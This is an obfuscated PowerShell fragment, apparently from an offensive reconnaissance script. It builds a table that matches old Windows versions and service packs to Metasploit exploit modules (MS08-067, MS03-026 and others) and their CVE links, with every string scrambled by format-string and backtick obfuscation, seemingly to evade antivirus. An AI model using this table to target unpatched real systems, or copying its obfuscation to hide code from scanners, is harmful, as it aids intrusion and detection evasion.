    ${N`Ull} = ${taB`leExP`lOI`TS}."R`OWS".("{0}{1}"-f'Ad','d').Invoke(("{1}{2}{0}{3}"-f ' ','Windows Serv','er','2000'),("{2}{0}{1}"-f' Pa','ck 2','Service'),("{9}{1}{0}{5}{2}{7}{3}{6}{8}{4}"-f '/','t','ndow','/ms0','dav','wi','3_007_ntdll_we','s/iis','b','exploi'),("{2}{3}{7}{1}{4}{8}{5}{0}{9}{6}"-f 'com/cve/2003-','/','htt','p','www.c','ails.','09',':/','vedet','01'))  
    ${NU`lL} = ${tABLE`E`xpLoI`Ts}."R`OwS".("{0}{1}"-f'A','dd').Invoke(("{2}{0}{3}{1}{5}{4}"-f'nd','v','Wi','ows Ser','2000','er '),("{0}{2}{1}{3}" -f 'Se','vice ','r','Pack 2'),("{1}{3}{6}{5}{8}{2}{4}{7}{0}" -f 's','e','s','xp','/smb/ms04_01','t','loi','1_lsas','/window'),("{1}{9}{2}{4}{3}{6}{5}{10}{8}{7}{0}"-f'3/','http:','www.','ede','cv','ls.','tai','-053','om/cve/2003','//','c'))  
    ${n`UlL} = ${T`ABL`eexpLOIts}."ro`wS".("{1}{0}" -f 'd','Ad').Invoke(("{3}{1}{2}{0}{5}{4}" -f 'w','d','o','Win','00','s Server 20'),("{0}{2}{1}{3}" -f 'Se','ce Pack ','rvi','2'),("{0}{4}{3}{5}{2}{1}"-f'exp','4_045_wins','0','ndows/wins/m','loit/wi','s'),("{9}{3}{10}{2}{6}{8}{0}{1}{7}{5}{4}" -f '/c','v','etails','p://www.cv','80/','4-10','.co','e/200','m','htt','ed'))  
    ${n`ULl} = ${tA`B`lEexP`lO`iTS}."r`OwS".("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{4}{1}{2}" -f 'Wi','s Ser','ver 2000','n','dow'),("{0}{1}{2}{3}"-f'Servi','ce Pa','ck',' 3'),("{8}{5}{4}{6}{0}{1}{3}{2}{7}"-f 'rpc','/ms03_','26_dco','0','t/wind','loi','ows/dce','m','exp'),("{6}{0}{7}{5}{3}{4}{1}{2}"-f '/www.','35','2/','m/c','ve/2003-0','ails.co','http:/','cvedet'))  
    ${n`Ull} = ${TAb`lEe`xp`lO`iTS}."R`ows".("{1}{0}" -f'd','Ad').Invoke(("{3}{0}{2}{1}"-f 'indows Se',' 2000','rver','W'),("{0}{2}{3}{4}{1}"-f'Se','3','rvice Pac','k',' '),("{0}{4}{6}{1}{2}{3}{5}"-f 'e','o','ws/dcerp','c/ms05_017_','xplo','msmq','it/wind'),("{1}{6}{3}{2}{5}{4}{0}"-f '5-0059','http://www.cv','co','etails.','/cve/200','m','ed'))  
    ${nU`Ll} = ${ta`BlEE`Xploi`Ts}."rO`Ws".("{1}{0}"-f 'dd','A').Invoke(("{0}{3}{2}{1}{4}" -f'Win','s Server ','ow','d','2000'),("{2}{0}{1}" -f 'erv','ice Pack 3','S'),("{6}{1}{3}{7}{2}{5}{4}{0}"-f'dav','loit','ms03_00','/w','l_web','7_ntdl','exp','indows/iis/'),("{3}{2}{5}{11}{7}{4}{8}{9}{1}{10}{0}{6}" -f '-010','ils.c','p','htt','d',':','9','cve','et','a','om/cve/2003','//www.'))  
    ${nU`LL} = ${TaBLEeX`pLO`I`Ts}."Ro`wS".("{1}{0}" -f 'dd','A').Invoke(("{0}{3}{4}{1}{2}" -f'Windows','r',' 2000',' Ser','ve'),("{1}{0}{3}{2}"-f 'ce Pa','Servi','3','ck '),("{0}{2}{3}{5}{1}{8}{4}{7}{6}"-f 'exp','/','loit/w','indow','in','s','ms04_045_wins','s/','w'),("{0}{10}{1}{5}{4}{2}{3}{9}{7}{8}{6}{12}{11}"-f 'h','p://','.','cvedeta','ww','w','/','s.co','m/cve','il','tt','4-1080/','200'))  
    ${nU`LL} = ${T`A`B`lEEXploITs}."Ro`ws".("{1}{0}"-f'd','Ad').Invoke(("{4}{0}{2}{3}{1}" -f'nd','000','ows Serv','er 2','Wi'),("{4}{0}{2}{3}{1}" -f 'ce','4',' Pac','k ','Servi'),("{0}{7}{2}{5}{1}{4}{6}{3}" -f 'exp','rpc','t/wind','03_026_dcom','/m','ows/dce','s','loi'),("{1}{3}{0}{7}{5}{6}{2}{4}"-f 'ww.','http:','ve/2003-03','//w','52/','om/','c','cvedetails.c'))  
    ${N`Ull} = ${t`ABLee`X`PLoits}."rO`WS".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{3}{4}{2}" -f'Win','dow',' 2000','s Serv','er'),("{3}{1}{2}{0}{4}" -f'e','r','vic','Se',' Pack 4'),("{8}{10}{3}{0}{1}{5}{2}{9}{6}{7}{4}"-f 'indo','ws/dcer','/ms','loit/w','smq','pc','_','m','e','05_017','xp'),("{0}{9}{4}{8}{6}{7}{1}{3}{2}{5}" -f'h','m','e/2005-00','/cv','//www','59','tai','ls.co','.cvede','ttp:'))  
    ${Nu`LL} = ${t`AblEExPl`OItS}."Ro`wS".("{1}{0}"-f'dd','A').Invoke(("{2}{3}{5}{1}{4}{0}" -f '00','Server','Wi','nd',' 20','ows '),("{3}{2}{4}{0}{1}"-f ' Pack ','4','rvic','Se','e'),("{0}{5}{10}{7}{6}{1}{8}{11}{3}{2}{4}{13}{12}{9}" -f'exploi','/','ms07_0','/','29_msdns_zonen','t/w','ows','d','dcer','e','in','pc','m','a'),("{0}{2}{3}{1}{7}{6}{5}{4}" -f'ht','vedeta','tp','://www.c','1748','e/2007-','om/cv','ils.c'))  
    ${N`Ull} = ${tA`BLE`Ex`P`LoITs}."r`OWS".("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{2}{0}{4}" -f 'v','Win','ows Ser','d','er 2000'),("{0}{1}{2}" -f'Se','rv','ice Pack 4'),("{4}{1}{0}{6}{3}{10}{5}{7}{8}{2}{9}" -f 'i','o','0','ndows','expl','smb/m','t/wi','s04','_','11_lsass','/'),("{5}{6}{1}{3}{2}{4}{0}" -f '3-0533/','w.cvedeta','20','ils.com/cve/','0','http','://ww'))  
    ${nu`lL} = ${tA`BlE`ExpLO`ITs}."r`oWs".("{0}{1}" -f 'Ad','d').Invoke(("{1}{4}{3}{2}{0}"-f'00','Wi','s Server 20','dow','n'),("{4}{0}{3}{2}{1}" -f'c','4','Pack ','e ','Servi'),("{5}{2}{7}{3}{6}{1}{0}{4}" -f'040','s06_','x','/s','_netapi','e','mb/m','ploit/windows'),("{6}{1}{0}{2}{4}{3}{5}"-f'detai','.cve','ls','2','.com/cve/','006-3439','http://www'))  
    ${n`UlL} = ${TaBleE`X`plo`Its}."r`OWs".("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}{4}{3}"-f'i','ndows S','W','2000','erver '),("{2}{0}{3}{1}"-f'rvice P','4','Se','ack '),("{4}{2}{1}{0}{6}{5}{7}{3}" -f'/sm','ws','/windo','wapi','exploit','/ms06_','b','066_n'),("{0}{7}{9}{2}{3}{5}{8}{4}{6}{10}{1}" -f 'htt','-4688','.cv','edet','m/cv','ai','e','p://ww','ls.co','w','/2006'))  
    ${n`ULL} = ${tablEeX`pL`O`iTs}."RO`ws".("{0}{1}" -f'A','dd').Invoke(("{2}{4}{5}{0}{1}{3}{6}" -f'ver',' 20','Win','0','dows S','er','0'),("{0}{3}{1}{2}"-f 'Service P','ck ','4','a'),("{8}{6}{5}{0}{3}{2}{4}{7}{1}"-f'mb/ms','c','6_07','0','0_w','ndows/s','oit/wi','kssv','expl'),("{6}{3}{7}{0}{1}{2}{5}{4}"-f 'cvedet','ails.co','m/','ttp','06-4691','cve/20','h','://www.'))  
    ${N`Ull} = ${TAb`LE`expl`OItS}."rO`WS".("{1}{0}"-f 'dd','A').Invoke(("{0}{3}{1}{2}"-f'Win','v','er 2000','dows Ser'),("{0}{3}{2}{1}"-f'S','k 4','e Pac','ervic'),("{2}{6}{1}{8}{7}{5}{4}{10}{3}{9}{0}"-f 'etapi','/w','explo','67_','s','ow','it','d','in','n','/smb/ms08_0'),("{7}{8}{1}{3}{0}{2}{5}{4}{6}" -f 'cvedetai','w','ls.com','.','e','/cv','/2008-4250','http','://ww'))  
    ${N`ULl} = ${t`ABl`eEXpl`O`ITS}."RO`Ws".("{0}{1}" -f 'A','dd').Invoke(("{5}{0}{4}{3}{1}{2}" -f'nd','ver',' 2000','Ser','ows ','Wi'),("{2}{1}{3}{0}" -f 'e Pack 4','r','Se','vic'),("{4}{0}{6}{2}{7}{1}{5}{3}" -f 'in','s/ms0','ws','5_wins','exploit/w','4_04','do','/win'),("{9}{5}{8}{1}{3}{2}{6}{4}{10}{0}{7}"-f '0','ww.c','tails.com/cv','vede','2','tp:','e/','4-1080/','//w','ht','0'))  
    ${NU`Ll} = ${T`ABL`eExpL`oI`Ts}."R`oWs".("{0}{1}"-f 'Ad','d').Invoke(("{2}{4}{1}{0}{3}"-f '0',' 20','Windows ','0','Server'),"",("{3}{1}{8}{5}{7}{4}{6}{2}{0}"-f 'com','loit/w','_d','exp','0','3','26','_','indows/dcerpc/ms0'),("{2}{8}{3}{10}{5}{0}{7}{4}{6}{9}{1}"-f'details','52/','htt','://','m/c','cve','ve/2003','.co','p','-03','www.'))  
    ${n`UlL} = ${Ta`BlEexPLO`I`TS}."rO`ws".("{0}{1}"-f 'A','dd').Invoke(("{4}{0}{2}{1}{3}"-f 'dows','00',' Server 2','0','Win'),"",("{1}{0}{4}{6}{7}{8}{5}{3}{2}" -f 'p','ex','mq','s','loi','5_017_m','t','/wind','ows/dcerpc/ms0'),("{5}{6}{2}{1}{4}{0}{3}" -f'20','.co','cvedetails','05-0059','m/cve/','http:','//www.'))  
    ${nu`ll} = ${taBLe`ex`PlOi`Ts}."r`OwS".("{1}{0}" -f'd','Ad').Invoke(("{2}{3}{1}{0}"-f ' 2000','ver','Windows Se','r'),"",("{8}{5}{1}{2}{4}{3}{0}{7}{6}" -f '03_','l','oit/','ows/iis/ms','wind','p','ebdav','007_ntdll_w','ex'),("{3}{4}{1}{0}{2}{6}{5}"-f'vedet','ww.c','ails.c','http','://w','09','om/cve/2003-01'))  
    ${NU`Ll} = ${TabLEexp`l`OITs}."ro`WS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{3}{1}"-f 'Wi','Server 2000','ndo','ws '),"",("{1}{4}{6}{5}{3}{0}{8}{7}{2}" -f'_03','exploi','np','smb/ms05','t','ws/','/windo','_p','9'),("{1}{2}{5}{3}{4}{7}{0}{6}" -f'2005-19','ht','t','vedetails.co','m','p://www.c','83','/cve/'))  
    ${NU`lL} = ${tA`Bl`eEX`pL`OITs}."R`OWs".("{0}{1}" -f'A','dd').Invoke(("{4}{0}{2}{1}{5}{3}"-f 'indo',' Ser','ws','00','W','ver 20'),"",("{4}{6}{3}{1}{5}{2}{0}"-f 'wins/ms04_045_wins','/','/','oit','ex','windows','pl'),("{3}{5}{4}{1}{6}{0}{2}"-f '08','/20','0/','http://www.cv','ils.com/cve','edeta','04-1'))  
    ${N`ULl} = ${t`AblEE`XP`lOI`Ts}."R`OwS".("{0}{1}"-f'A','dd').Invoke(("{1}{4}{2}{3}{0}"-f '3','Windows Serv',' 2','00','er'),("{0}{2}{1}{3}" -f'S','er Pa','erv','ck 1'),("{7}{4}{5}{0}{2}{3}{1}{6}"-f'indows/','ns_zo','dcer','pc/ms07_029_msd','i','t/w','nename','explo'),("{1}{3}{6}{0}{5}{4}{7}{2}"-f 'ww.cvedetail','http:','1748','/','m/cve/2','s.co','/w','007-'))  
    ${Nu`LL} = ${tA`BlE`eXpLoItS}."RO`ws".("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{3}{1}"-f's',' 2003','Window',' Server'),("{2}{3}{0}{1}"-f'er',' Pack 1','Ser','v'),("{9}{6}{2}{0}{1}{7}{3}{10}{8}{5}{4}" -f 'ndows/s','mb/','t/wi','_','pi','ta','loi','ms06','ne','exp','040_'),("{2}{9}{6}{11}{5}{10}{3}{4}{7}{8}{0}{1}"-f'/2006-3','439','htt','etai','l','e','//www.c','s.com','/cve','p:','d','v'))  
    ${nU`LL} = ${t`AbL`eeXPLoiTS}."Ro`wS".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{3}{0}"-f 'r 2003','Windo','ws Se','rve'),("{1}{2}{0}" -f ' Pack 1','Ser','ver'),("{1}{2}{6}{4}{3}{5}{0}{7}" -f'6_066_n','exp','loi','ws/sm','indo','b/ms0','t/w','wapi'),("{0}{9}{8}{3}{5}{4}{6}{7}{2}{1}" -f'http://ww','-4688','2006','cvedetai','com/c','ls.','ve','/','.','w'))  
    ${N`UlL} = ${T`AbL`E`eX`PloIts}."Ro`Ws".("{0}{1}"-f'Ad','d').Invoke(("{2}{0}{3}{1}"-f 's Se','003','Window','rver 2'),("{1}{2}{4}{0}{3}"-f ' ','Serve','r Pa','1','ck'),("{4}{0}{2}{6}{3}{1}{5}" -f 'lo','08_067_neta','it/w','/ms','exp','pi','indows/smb'),("{5}{1}{8}{7}{0}{10}{9}{4}{2}{3}{6}" -f 'etai',':/','-','4','008','http','250','d','/www.cve','m/cve/2','ls.co'))  
    ${N`ULL} = ${taBlEEX`pL`O`ITS}."r`OWs".("{0}{1}" -f'A','dd').Invoke(("{5}{2}{1}{0}{4}{3}" -f 'v','er','dows S','003','er 2','Win'),("{1}{3}{0}{2}"-f 've','Se','r Pack 1','r'),("{2}{8}{5}{6}{7}{0}{3}{9}{1}{4}"-f 'n','_04','e','s/ms0','5_wins','t','/windows/w','i','xploi','4'),("{6}{3}{1}{0}{5}{4}{2}" -f'/cve/20','ww.cvedetails.com','0/','tp://w','8','04-10','ht'))  
    ${n`UlL} = ${taB`Le`eX`plO`ITS}."RO`WS".("{1}{0}" -f'dd','A').Invoke(("{2}{1}{4}{5}{6}{0}{3}" -f 'ver 2','ind','W','003','o','ws Se','r'),("{1}{2}{0}"-f'e Pack 2','Servi','c'),("{4}{7}{5}{8}{3}{0}{2}{6}{1}"-f '/ms07_029_','me','m','erpc','exploi','/wind','sdns_zonena','t','ows/dc'),("{2}{5}{1}{0}{6}{3}{8}{7}{4}"-f 'ww.cved','/w','h','tails.com/c','1748','ttp:/','e','2007-','ve/'))  
    ${NU`Ll} = ${Tab`L`eEx`p`loITs}."R`ows".("{1}{0}" -f 'd','Ad').Invoke(("{3}{4}{1}{2}{0}" -f'3',' Server 2','00','Win','dows'),("{1}{0}{2}{3}"-f'rvice','Se',' Pack',' 2'),("{8}{3}{9}{6}{1}{4}{5}{0}{2}{7}" -f '7_ne','08_','t','/w','0','6','dows/smb/ms','api','exploit','in'),("{4}{0}{5}{7}{6}{3}{1}{2}" -f 'ttp','0','8-4250','/cve/20','h','://w','w.cvedetails.com','w'))  
    ${N`Ull} = ${tAbleexP`l`oI`Ts}."R`owS".("{0}{1}"-f'A','dd').Invoke(("{0}{5}{4}{2}{3}{1}" -f 'Windows Se','3','2','00','r ','rve'),("{3}{2}{0}{1}" -f 'ic','e Pack 2','v','Ser'),("{0}{7}{9}{5}{10}{6}{1}{3}{4}{2}{8}" -f'exploit/wi','061_s','ls','p','oo','m','s10_','ndows/','s','s','b/m'),("{6}{2}{5}{4}{3}{0}{1}"-f '/2010','-2729','t','ils.com/cve','edeta','tp://www.cv','h'))  
    ${N`Ull} = ${TAbl`EeXP`LO`its}."r`OWS".("{1}{0}" -f 'dd','A').Invoke(("{0}{3}{4}{1}{2}{5}" -f 'Wind','rve','r 20','ows ','Se','03'),"",("{0}{2}{8}{4}{6}{5}{3}{7}{1}" -f 'expl','6_dcom','oit/win','03_','dc','s','erpc/m','02','dows/'),("{5}{6}{4}{3}{0}{2}{1}"-f'2003','/','-0352','m/cve/','etails.co','http://www','.cved'))  
    ${N`UlL} = ${Ta`BLeeXp`Lo`Its}."Ro`Ws".("{0}{1}"-f'A','dd').Invoke(("{2}{3}{1}{0}{4}"-f' 20','rver','Windo','ws Se','03'),"",("{3}{0}{1}{4}{6}{2}{5}"-f 'loit/','windows/smb','s06_04','exp','/','0_netapi','m'),("{10}{0}{1}{3}{5}{8}{7}{9}{2}{11}{4}{6}" -f '://','ww','ve/200','w.cvedet','3','a','439','com','ils.','/c','http','6-'))  
    ${Nu`ll} = ${tA`B`lEe`XPlOits}."R`OWs".("{1}{0}"-f'd','Ad').Invoke(("{0}{3}{1}{2}" -f 'Windows ','2','003','Server '),"",("{0}{3}{5}{1}{6}{2}{4}" -f 'e','ows/sm','8_0','xp','67_netapi','loit/wind','b/ms0'),("{1}{3}{7}{0}{5}{4}{2}{6}"-f 'e','h','008','ttp://www.','cve/2','details.com/','-4250','cv'))  
    ${n`ULl} = ${TabLEe`XPLo`i`Ts}."R`OWS".("{1}{0}"-f 'dd','A').Invoke(("{3}{1}{0}{2}"-f'erver 200','s S','3','Window'),"",("{9}{6}{10}{7}{0}{4}{2}{1}{3}{5}{8}" -f '/w','s/ms04','n','_045','i','_wi','oit/w','dows','ns','expl','in'),("{2}{4}{7}{1}{0}{3}{5}{6}" -f 'ls.c','i','http:','om','//www.','/cve/2004-108','0/','cvedeta'))  
    ${nU`Ll} = ${T`Ab`lEExP`LOI`TS}."R`OWS".("{0}{1}" -f 'A','dd').Invoke(("{2}{4}{6}{0}{3}{1}{5}" -f 'o',' Se','W','ws','i','rver 2003 R2','nd'),"",("{2}{6}{7}{5}{0}{9}{8}{3}{1}{4}"-f's/dce','03','expl','s','_026_dcom','w','oit/win','do','c/m','rp'),("{8}{6}{4}{9}{5}{2}{3}{0}{1}{7}"-f'cve/2','0','ails','.com/','c','et','ttp://www.','03-0352/','h','ved'))  
    ${N`Ull} = ${TAbLEE`X`PLoI`TS}."ro`ws".("{0}{1}" -f'A','dd').Invoke(("{0}{5}{4}{1}{2}{3}"-f'Wi','erv','er 200','3 R2',' S','ndows'),"",("{5}{8}{3}{2}{6}{0}{7}{1}{4}" -f's04_0','_lsas','/','smb','s','exploit/windo','m','11','ws/'),("{5}{6}{1}{0}{7}{2}{3}{4}" -f 'o','details.c','cve/2003-05','3','3/','h','ttp://www.cve','m/'))  
    ${N`UlL} = ${TA`BLee`XpL`oITs}."r`OWS".("{0}{1}"-f'Ad','d').Invoke(("{0}{4}{2}{3}{1}"-f 'Wi','03 R2','ows Serve','r 20','nd'),"",("{7}{3}{8}{1}{9}{4}{6}{10}{5}{0}{2}"-f 'tap','/','i','t/windows','06_0','_ne','4','exploi','/smb','ms','0'),("{0}{7}{8}{3}{4}{2}{1}{10}{5}{9}{6}{11}" -f'http','tails','e','/www','.cved','/cve','06-34',':','/','/20','.com','39'))  
    ${N`ULL} = ${tAb`LeexP`lo`Its}."R`oWS".("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{0}{6}{4}{2}{5}"-f 'Ser','Windows',' ',' ','03','R2','ver 20'),"",("{5}{4}{0}{3}{6}{2}{1}" -f's','045_wins','s/ms04_','/wi','window','exploit/','n'),("{9}{7}{11}{1}{4}{5}{3}{2}{10}{8}{0}{6}" -f'-1','//w','i','cvedeta','w','w.','080/','tp','04','ht','ls.com/cve/20',':'))  
    ${n`UlL} = ${tabLe`eX`PLoi`Ts}."RO`Ws".("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{3}{1}"-f'Win',' 2008','dows S','erver'),("{0}{2}{3}{1}" -f 'S','e Pack 2','erv','ic'),("{4}{3}{9}{7}{10}{2}{12}{5}{6}{11}{8}{1}{0}"-f 'x','_inde','_smb2_ne','loit','exp','otia','t','dows/smb/','func','/win','ms09_050','e_','g'),("{8}{4}{2}{9}{3}{5}{7}{10}{1}{0}{6}" -f'09-','20','edeta','com/c','.cv','v','3103','e','http://www','ils.','/'))  
    ${N`ULl} = ${TablE`E`XP`L`oItS}."ro`wS".("{1}{0}"-f 'dd','A').Invoke(("{1}{2}{0}{3}" -f'Serve','Wind','ows ','r 2008'),("{1}{4}{0}{2}{3}"-f'ice P','S','ack ','2','erv'),("{7}{3}{8}{0}{5}{6}{1}{2}{4}" -f'indo','0_','0','xp','61_spoolss','ws','/smb/ms1','e','loit/w'),("{3}{0}{1}{2}{4}{5}{6}" -f'p://ww','w.cvedetai','l','htt','s.com/cve/','2010','-2729'))  
    ${n`ULL} = ${ta`BLee`x`plOi`TS}."R`oWs".("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{3}{0}" -f '2008','dows Server','Win',' '),"",("{8}{3}{6}{2}{9}{1}{4}{7}{5}{0}" -f'i','b/ms08_06','/windo','o','7_net','p','it','a','expl','ws/sm'),("{9}{11}{10}{1}{0}{3}{8}{2}{4}{6}{5}{7}" -f 'ails.c','/www.cvedet','008','o','-','2','4','50','m/cve/2','http','/',':'))  
    ${N`UlL} = ${Ta`BL`eEx`ploItS}."rO`wS".("{1}{0}" -f 'dd','A').Invoke(("{0}{5}{2}{1}{4}{3}"-f'W','ver 2','dows Ser','8','00','in'),"",("{2}{8}{9}{1}{6}{5}{4}{0}{7}{3}" -f'e','_050','ex','x','gotiat','_ne','_smb2','_func_inde','plo','it/windows/smb/ms09'),("{1}{4}{5}{0}{8}{2}{6}{7}{9}{3}{10}" -f'w','http','etai','om/cve/2009-31',':/','/','l','s.','ww.cved','c','03'))  
    ${nU`lL} = ${tAb`lEE`xP`loiTs}."rO`wS".("{0}{1}" -f 'Ad','d').Invoke(("{2}{3}{5}{0}{1}{4}" -f 'Se','rv','Window','s','er 2008',' '),"",("{1}{2}{4}{6}{7}{3}{0}{8}{5}"-f'1_sp','explo','it/windo','6','ws/s','s','mb/ms','10_0','ools'),("{5}{7}{2}{1}{6}{3}{11}{4}{8}{9}{10}{0}" -f'29','.cve','ww','ils.c','ve/','http:/','deta','/w','2010-','2','7','om/c'))  
    ${nU`Ll} = ${T`AB`LEEXPL`OI`TS}."RO`ws".("{0}{1}" -f 'A','dd').Invoke(("{2}{4}{3}{0}{1}" -f'r 20','08 R2','Windows ','erve','S'),"",("{10}{5}{7}{1}{8}{0}{2}{6}{3}{4}{9}" -f 'ow','/','s/smb/m','10_','061_spoo','pl','s','oit','wind','lss','ex'),("{4}{1}{2}{7}{3}{5}{0}{6}{8}" -f 'e/20','://w','ww.cvedet','s.','http','com/cv','10','ail','-2729'))  
    ${n`ULL} = ${tAbL`Eex`pl`OITs}."RO`wS".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{3}{2}"-f 'Windo','ws Vi','a','st'),("{1}{0}{2}"-f'erver ','S','Pack 1'),("{2}{4}{8}{3}{0}{6}{9}{1}{7}{5}" -f'ndow','m','expl','t/wi','o','08_067_netapi','s/s','s','i','mb/'),("{4}{2}{3}{5}{0}{1}{6}"-f'om/cve/','2008-425','w.','cvedetails','http://ww','.c','0'))  
    ${Nu`ll} = ${T`Abl`ee`X`pLoITs}."r`Ows".("{1}{0}"-f'd','Ad').Invoke(("{2}{1}{0}"-f'sta','dows Vi','Win'),("{1}{2}{0}"-f'1','Serve','r Pack '),("{7}{0}{13}{4}{5}{2}{1}{9}{6}{11}{8}{14}{12}{10}{3}" -f'plo','ws','o','nc_index','t/','wind','smb/','ex','_','/','te_fu','ms09_050_smb2','otia','i','neg'),("{3}{5}{2}{9}{4}{7}{6}{0}{8}{1}"-f 'e/200','103','/w','ht','detail','tp:/','m/cv','s.co','9-3','ww.cve'))  
    ${NU`LL} = ${T`ABL`ee`Xploi`Ts}."ro`Ws".("{1}{0}" -f 'd','Ad').Invoke(("{3}{0}{2}{1}" -f 'i',' Vista','ndows','W'),("{1}{2}{3}{0}" -f '1','S','er','ver Pack '),("{1}{6}{8}{7}{3}{5}{2}{4}{0}" -f 'olss','e','_061_s','/smb/ms1','po','0','xploit/wi','s','ndow'),("{6}{0}{1}{4}{7}{3}{5}{2}" -f'w','w.cvedetai','9','m/cve/2010-','l','272','http://w','s.co'))  
    ${nu`Ll} = ${TABlE`E`xP`L`oItS}."Ro`Ws".("{0}{1}"-f 'A','dd').Invoke(("{2}{0}{1}"-f 'ws ','Vista','Windo'),("{0}{2}{3}{4}{1}" -f'Se',' 2','rv','ice ','Pack'),("{10}{0}{11}{7}{1}{12}{2}{3}{5}{6}{8}{9}{4}" -f 'ploit','s/smb/m','09_050_s','mb2','nc_index','_ne','goti','ndow','ate_','fu','ex','/wi','s'),("{5}{3}{2}{0}{7}{8}{4}{6}{1}"-f'cvedet','3','.','ttp://www','2','h','009-310','ails','.com/cve/'))  
    ${n`UlL} = ${tAb`L`EExP`l`oits}."r`oWS".("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{0}{3}"-f 'n','i','W','dows Vista'),("{2}{1}{0}"-f 'k 2','Pac','Service '),("{5}{0}{2}{6}{10}{1}{8}{3}{9}{7}{4}" -f 'ploi','6','t/wind','s','ss','ex','ows/smb/','l','1_','poo','ms10_0'),("{1}{6}{5}{8}{4}{7}{0}{9}{10}{11}{2}{3}"-f 'co','ht','/','2010-2729','l','www.cved','tp://','s.','etai','m','/','cve'))  
    ${nu`lL} = ${TAB`l`eEXpL`oiTs}."Ro`ws".("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}" -f 'sta','indows Vi','W'),"",("{2}{1}{7}{9}{0}{8}{4}{3}{6}{5}"-f'/windows','xp','e','s0','mb/m','tapi','8_067_ne','lo','/s','it'),("{6}{2}{1}{4}{5}{3}{0}" -f'-4250','cvede','p://www.','008','tai','ls.com/cve/2','htt'))  
    ${Nu`LL} = ${TaBlee`xpL`OIts}."rO`ws".("{1}{0}" -f'dd','A').Invoke(("{4}{3}{0}{1}{2}"-f 'Vi','st','a','ows ','Wind'),"",("{9}{5}{8}{4}{7}{3}{1}{0}{2}{6}"-f'iat','t','e_fun','_smb2_nego','s','ploit/windows/sm','c_index','09_050','b/m','ex'),("{10}{2}{0}{7}{5}{8}{3}{9}{1}{6}{4}"-f'v','09-31','p://www.c','tails.com/cv','3','d','0','e','e','e/20','htt'))  
    ${n`UlL} = ${taB`leExplO`iTS}."rO`wS".("{1}{0}"-f'd','Ad').Invoke(("{2}{0}{1}"-f 'n','dows XP','Wi'),("{0}{2}{3}{1}" -f'Se','k 1','rver Pa','c'),("{4}{2}{3}{0}{1}{6}{5}"-f 'loi','t/w','x','p','e','_dcom','indows/dcerpc/ms03_026'),("{6}{7}{0}{2}{5}{8}{1}{4}{3}"-f'ed','0','etails','3-0352/','0','.com/cv','h','ttp://www.cv','e/2'))  
    ${nU`ll} = ${TAbl`eEXP`l`oitS}."r`oWS".("{0}{1}" -f'A','dd').Invoke(("{1}{0}{2}" -f 'dows','Win',' XP'),("{4}{0}{3}{2}{1}" -f'e',' Pack 1','er','rv','S'),("{4}{7}{6}{5}{8}{1}{0}{2}{3}"-f '17_m','s05_0','sm','q','exploit','indows/dcerpc/','w','/','m'),("{1}{7}{8}{2}{0}{4}{5}{6}{3}"-f 'ails.com','ht','ww.cvedet','59','/','c','ve/2005-00','tp://','w'))  
    ${N`UlL} = ${Ta`BleExPl`Oi`TS}."Ro`Ws".("{0}{1}" -f'A','dd').Invoke(("{1}{0}{3}{2}" -f'o','Wind','P','ws X'),("{2}{3}{1}{0}{4}" -f'ac','er P','Se','rv','k 1'),("{6}{3}{1}{2}{4}{5}{0}"-f'ss','t/windows/smb','/ms0','oi','4','_011_lsa','expl'),("{10}{7}{1}{4}{2}{9}{0}{6}{3}{8}{11}{5}" -f 'ils','/','ede','o','/www.cv','3-0533/','.c','ttp:','m/cve/','ta','h','200'))  
    ${N`UlL} = ${TAb`LEExplO`i`TS}."R`Ows".("{0}{1}" -f'A','dd').Invoke(("{0}{1}{2}" -f'W','indo','ws XP'),("{1}{0}{2}{3}" -f' Pa','Server','ck ','1'),("{3}{0}{5}{2}{1}{4}" -f's/smb/ms05','3','0','exploit/window','9_pnp','_'),("{0}{7}{6}{5}{3}{2}{4}{1}"-f 'http://','3','/','om','cve/2005-198','ls.c','tai','www.cvede'))  
    ${n`UlL} = ${TAb`lEexPlO`iTs}."RO`ws".("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}"-f 'ows ','XP','Wind'),("{0}{3}{1}{2}"-f 'Server','ack',' 1',' P'),("{10}{5}{4}{3}{9}{7}{2}{8}{6}{0}{1}"-f 'p','i','mb/ms06_04','indow','oit/w','l','a','/s','0_net','s','exp'),("{3}{7}{2}{5}{0}{8}{6}{1}{4}{9}" -f 'ta','om','c','http:','/cve/2006-3','vede','ls.c','//www.','i','439'))  
    ${nu`lL} = ${taBL`E`eXploITs}."ro`ws".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}" -f 'Wind','ows X','P'),("{0}{1}{2}" -f 'Se','rvic','e Pack 2'),("{2}{5}{3}{6}{9}{4}{1}{7}{8}{0}"-f'smq','ows/','e','pl','wind','x','oi','dcerpc/ms05_017_','m','t/'),("{7}{2}{0}{9}{4}{5}{6}{8}{3}{1}{10}"-f'cved','00','//www.','005-','.','com/','cve/','http:','2','etails','59'))  
    ${n`ULL} = ${tA`Blee`Xp`LoI`TS}."Ro`ws".("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}" -f'ndows XP','i','W'),("{1}{2}{0}{4}{3}"-f'i','S','erv',' 2','ce Pack'),("{1}{5}{6}{3}{4}{0}{2}{7}" -f 'ms0','ex','6_040_netap','dows/smb','/','ploit/w','in','i'),("{4}{5}{2}{0}{3}{1}{6}{9}{8}{7}{10}"-f 'tails','c','de','.com/','http://www.c','ve','ve/2','-343','06','0','9'))  
